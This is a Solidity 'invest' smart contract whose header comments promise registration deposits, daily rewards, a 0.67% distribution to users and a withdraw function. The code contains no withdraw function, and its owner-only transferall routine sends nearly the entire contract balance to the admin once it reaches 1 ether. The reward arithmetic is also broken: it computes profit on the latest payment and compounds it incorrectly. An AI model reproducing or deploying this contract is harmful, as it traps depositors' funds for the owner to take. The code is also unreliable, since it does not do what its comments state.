// SPDX-License-Identifier: GPL-3.0

//OBJECTIVES
// 1. Register users. A user will be registered upon depositing a registration fee of 0.0169 ether. Not less, not more. Registered user can deposit more capital to earn reward after this.

// 2. It gives each registered user a reward of 0.0171% on their deposited capital per day. Interest can be compounding or simple. 

// 3. There will be a variable called "liquifyLimit = 1 ether". At any point in time if the contract balance reaches a value equals to this liquifyLimit variable then 0.67% of contract balance will be distributed among all the registered users.(Added to their account.)

// 4. Calculated/Pending reward will be transferred to user's wallet when user clicks/calls withdraw button/function. 


pragma solidity >=0.7.0 <0.9.0;

contract invest {

    struct User {
        uint256 amount;
        uint256 profit;
        uint256 profit_withdrawn;
        uint256 start_time;
        uint256 end_time;
        bool time_started;
        
    }

    uint256 day =86400;
    uint256 liquifyLimit = 1000000000000000000;
    uint256 test=0;
    bool contract_over;
    address public admin;
    address payable[] public usersList;
    mapping(address =>  User) public  users;
    
    event Received(address, uint);
     
     constructor() {
        admin = msg.sender;
        contract_over=false;
      
    }
    
    modifier notOwner() {
        require(admin != msg.sender, "You are the owner");
        _;
    }
     modifier Owner() {
        require(admin == msg.sender, "You are not  the owner");
        _;
    }

    function invest_fun() public payable notOwner {
        require(msg.value == 16900000000000000 || users[msg.sender].time_started==true,"Enter only 0.0169 ether");

        if (users[msg.sender].time_started == false) {
            usersList.push(payable(msg.sender));
            users[msg.sender].start_time = block.timestamp;
            users[msg.sender].time_started = true;
            users[msg.sender].end_time = block.timestamp + 1 days;
        }
        users[msg.sender].amount += msg.value;
        
        if(block.timestamp >= users[msg.sender].end_time){
        test = uint((block.timestamp-users[msg.sender].start_time)/(day));
        if(test>0){
        users[msg.sender].profit += ( (msg.value * 171 * test ) / (1000000));
        users[msg.sender].amount+=users[msg.sender].profit;
        users[msg.sender].start_time=block.timestamp;
        users[msg.sender].end_time=block.timestamp+ 1 days;
        }
        }
        
}

  function balanceof() public view returns(uint){
        return address(this).balance;
    }

    function getusersbalance() public view returns (uint){
        return users[msg.sender].amount;
}

 
     
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    function transferall() public Owner returns(bool){

        if(balanceof() >= liquifyLimit ){
        for(uint i=0; i<usersList.length; i++){
           payable(usersList[i]).transfer( balanceof()*67/(10000* usersList.length)); 
     }
     payable(admin).transfer(balanceof()-balanceof()*67/(10000));
        contract_over=true;
        }
        return contract_over;
    }

}